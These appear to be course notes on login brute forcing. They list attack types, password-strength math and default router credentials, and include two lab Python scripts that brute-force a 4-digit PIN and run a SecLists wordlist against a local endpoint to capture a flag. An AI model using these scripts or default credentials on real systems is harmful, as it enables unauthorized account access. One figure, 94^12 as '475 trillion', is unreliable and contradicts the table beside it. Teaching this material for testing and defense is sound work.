
# Login Brute Forcing

## What is Brute Forcing?
Brute forcing is a trial-and-error method used to crack passwords, login credentials, or encryption keys by trying every possible combination of characters until the correct one is found.

### Key Factors:
- **Password complexity**: Longer, more complex passwords are harder to crack.
- **Computational power**: More powerful hardware accelerates the process.
- **Security measures**: Measures like account lockouts and CAPTCHAs slow down brute force attempts.

## How Brute Forcing Works:
1. **Start**: Attacker initiates brute force using specialized software.
2. **Generate Combination**: Software generates potential password combinations.
3. **Apply Combination**: The system tests the combination.
4. **Check if Successful**: The system evaluates if the combination is correct.
5. **Access Granted**: If successful, unauthorized access is granted.
6. **End**: If unsuccessful, the process repeats with new combinations.

## Types of Brute Forcing:
- **Simple Brute Force**: Systematically tries all possible combinations.
- **Dictionary Attack**: Uses a list of common words and phrases.
- **Hybrid Attack**: Combines brute force and dictionary attack strategies.
- **Credential Stuffing**: Uses leaked credentials to access multiple services.
- **Password Spraying**: Attempts common passwords on many accounts to avoid lockouts.
- **Rainbow Table Attack**: Uses pre-computed password hashes for quicker cracking.
- **Reverse Brute Force**: Targets a single password against multiple usernames.
- **Distributed Brute Force**: Distributes the brute-force load across multiple machines.

## Brute Forcing in Penetration Testing
Brute forcing is a tool used in penetration testing to identify weaknesses in password-based authentication:
- **When other methods fail**: If no vulnerabilities are found, brute forcing may be employed.
- **Weak password policies**: Systems with weak password policies are vulnerable.
- **Targeting specific accounts**: Brute forcing can focus on accounts with elevated privileges.

---

# Password Security Fundamentals

### Importance of Strong Passwords:
- **Stronger passwords**: Harder for attackers to crack through brute force.
- **Longer passwords**: Exponentially increase the combinations an attacker must try.

### Anatomy of a Strong Password:
- **Length**: Minimum 12 characters; longer passwords are better.
- **Complexity**: Use a mix of upper and lowercase letters, numbers, and symbols.
- **Uniqueness**: Avoid reusing passwords across different accounts.
- **Randomness**: Avoid dictionary words or personal information.

### Common Password Weaknesses:
- **Short passwords**: Easily cracked with fewer combinations.
- **Common words and phrases**: Vulnerable to dictionary attacks.
- **Personal information**: Can be easily guessed by attackers using social engineering.
- **Reusing passwords**: Increases risk if one account is compromised.
- **Predictable patterns**: Simple sequences like “123456” or “qwerty.”

## Password Policies
Organizations use password policies to enforce strong password practices:
- **Minimum length**: Enforcing a minimum number of characters.
- **Complexity**: Requiring specific character types (e.g., symbols, numbers).
- **Expiration**: Requiring regular password changes.
- **Password history**: Preventing reuse of previous passwords.

### Default Credentials:
- **Default passwords**: Simple and often easily guessable passwords for devices or services.
- **Default usernames**: Common usernames like "admin" or "root" pose a security risk.

| Device/Manufacturer | Default Username | Default Password | Device Type |
|---------------------|------------------|------------------|-------------|
| Linksys Router      | admin            | admin            | Router      |
| D-Link Router       | admin            | admin            | Router      |
| Netgear Router      | admin            | password         | Router      |
| Canon Printer       | admin            | admin            | Printer     |

## Brute-Forcing & Password Security
- **Evaluating vulnerabilities**: Brute force can highlight weak password practices.
- **Strategic tool selection**: Complexity of passwords influences which brute force method is used.
- **Resource allocation**: Time and power needed depend on password strength.
- **Exploiting default credentials**: Default passwords are often the weakest points in security.

---

# Brute Force Attacks

## Overview
Brute force attacks are a method of cracking passwords, encryption keys, or PINs by systematically trying all possible combinations until the correct one is found. The complexity of brute-forcing increases exponentially as the password length and character set grow, which significantly affects the time and resources required to crack the password.

## Mathematical Foundation of Brute Force
### Formula:
**Possible Combinations = Character Set Size ^ Password Length**

Example:
- **6-character password** with only lowercase letters (26 characters):  
  `26^6 ≈ 300 million possible combinations`
- **8-character password** with only lowercase letters:  
  `26^8 ≈ 200 billion possible combinations`
- **12-character password** with lowercase, uppercase, numbers, and symbols:  
  `94^12 ≈ 475 trillion combinations`

### Impact of Password Length and Complexity
Increasing password length or character set (adding uppercase letters, numbers, symbols) exponentially increases the number of possible combinations, making brute-forcing more challenging.

| **Password Length** | **Character Set**                               | **Possible Combinations**         |
|---------------------|-------------------------------------------------|----------------------------------|
| 6                   | Lowercase letters (a-z)                        | 26^6 ≈ 300 million              |
| 8                   | Lowercase letters (a-z)                        | 26^8 ≈ 200 billion              |
| 8                   | Lowercase + Uppercase letters (a-z, A-Z)       | 52^8 ≈ 53 trillion              |
| 12                  | Lowercase + Uppercase + Numbers + Symbols      | 94^12 ≈ 475 trillion trillion   |

## Brute Force Speed and Hardware Influence
- **Basic Computer (1 million passwords/second)**:  
  Adequate for cracking simple passwords, but becomes impractical for complex passwords.
  - Example: Cracking an 8-character alphanumeric password would take ~6.92 years.
  
- **Supercomputer (1 trillion passwords/second)**:  
  Greatly accelerates brute-forcing, but even with massive resources, cracking complex passwords can still take an impractical amount of time.
  - Example: Cracking a 12-character password with all ASCII characters would take ~15,000 years.

## Practical Example: Cracking a 4-Digit PIN
The following Python script demonstrates a brute-force attack on a simple system that generates a random 4-digit PIN.

### Python Code: `pin-solver.py`
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send request to server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if correct PIN found
    if response.ok and 'flag' in response.json():  # .ok means status code 200
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### Process:
1. The script systematically attempts all possible PINs (0000 to 9999).
2. It sends GET requests to a server endpoint `/pin` with each PIN.
3. The server responds with success and a flag when the correct PIN is guessed.

---

# Dictionary Attacks: Overview

## What is a Dictionary Attack?
A **dictionary attack** exploits human tendencies to use predictable, simple passwords like dictionary words or common phrases. By using a precompiled list of likely passwords, attackers can efficiently crack weak passwords, making it faster than brute-forcing.

## Brute Force vs. Dictionary Attack

| Feature                 | Dictionary Attack                                    | Brute Force Attack                              |
|-------------------------|------------------------------------------------------|-------------------------------------------------|
| **Efficiency**           | Faster and more efficient                           | Time-consuming and resource-intensive           |
| **Targeting**            | Can be tailored based on target info                | No targeting, tests all combinations            |
| **Effectiveness**        | Works well for weak passwords                       | Works for all passwords, but slower             |
| **Limitations**          | Ineffective against complex passwords               | Inefficient for complex passwords               |

## Wordlist Creation
- **Public Lists**: Collections of common passwords (e.g., rockyou.txt).
- **Custom Lists**: Built from target-specific information.
- **Pre-existing Lists**: Available with tools like SecLists.

### Example Wordlists:
| Wordlist                        | Description                                           | Source                |
|----------------------------------|-------------------------------------------------------|-----------------------|
| rockyou.txt                      | List of passwords from the RockYou breach.            | RockYou breach dataset|
| 2023-200_most_used_passwords.txt | Most used passwords as of 2023                        | SecLists              |

## Example: Dictionary Attack Script
### Python Script: `dictionary-solver.py`
```python
import requests

ip = "127.0.0.1"  # Your IP address
port = 1234       # Your port number

passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

for password in passwords:
    print(f"Attempted password: {password}")
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
    if response.ok and 'flag' in response.json():
        print(f"Correct password: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

---

